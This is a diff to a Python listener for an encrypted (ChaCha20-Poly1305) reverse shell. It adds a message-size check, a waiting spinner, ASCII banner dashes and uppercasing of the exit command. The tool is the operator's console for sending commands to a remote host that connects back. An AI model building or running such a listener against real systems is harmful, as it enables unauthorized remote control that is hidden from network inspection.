@@ -6,6 +6,8 @@ import os
 import socket
 import struct
 import sys
+import threading
+import time
 
 from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 
@@ -70,6 +72,8 @@ def recv_msg(sock, key):
     if header is None:
         return None
     size = struct.unpack("<I", header)[0]
+    if size > 65600:
+        return None
     payload = recv_exact(sock, size)
     if payload is None:
         return None
@@ -98,7 +102,7 @@ def print_banner(lhost, lport, key_hex):
         f"  {C_OVERLAY}chacha20-poly1305 "
         f"reverse shell{C_RESET}"
     )
-    print(f"  {C_SURFACE}{'─' * 36}{C_RESET}")
+    print(f"  {C_SURFACE}{'-' * 36}{C_RESET}")
     print(
         f"  {C_BLUE}[*]{C_RESET} Listening on "
         f"{C_TEXT}{lhost}:{lport}{C_RESET}"
@@ -108,7 +112,7 @@ def print_banner(lhost, lport, key_hex):
         f"{C_PEACH}{key_hex[:8]}{C_OVERLAY}..."
         f"{C_PEACH}{key_hex[-8:]}{C_RESET}"
     )
-    print(f"  {C_SURFACE}{'─' * 36}{C_RESET}")
+    print(f"  {C_SURFACE}{'-' * 36}{C_RESET}")
     print()
 
 
@@ -136,7 +140,9 @@ def handle_session(conn, addr, key):
             continue
 
         try:
-            send_msg(conn, key, cmd.encode("utf-8"))
+            send_msg(conn, key, cmd.upper().encode("utf-8")
+                     if cmd.lower() == "exit"
+                     else cmd.encode("utf-8"))
         except (BrokenPipeError, ConnectionError):
             print(
                 f"{C_RED}[!]{C_RESET} Connection lost."
@@ -147,14 +153,40 @@ def handle_session(conn, addr, key):
             print(f"{C_PEACH}[*]{C_RESET} EXIT sent.")
             break
 
+        # Show spinner while waiting for response
+        stop_spinner = threading.Event()
+
+        def spinner():
+            chars = "\\|/-"
+            i = 0
+            start = time.time()
+            while not stop_spinner.is_set():
+                elapsed = time.time() - start
+                print(
+                    f"\r{C_PEACH}[{chars[i % 4]}]{C_RESET}"
+                    f" Waiting... {elapsed:.0f}s",
+                    end="", flush=True,
+                )
+                i += 1
+                stop_spinner.wait(0.15)
+            print("\r" + " " * 40 + "\r", end="", flush=True)
+
+        t = threading.Thread(target=spinner, daemon=True)
+        t.start()
+
         try:
             result = recv_msg(conn, key)
         except Exception:
+            stop_spinner.set()
+            t.join()
             print(
                 f"{C_RED}[!]{C_RESET} "
                 f"Decrypt failed or connection lost."
             )
             break
+
+        stop_spinner.set()
+        t.join()
 
         if result is None:
             print(
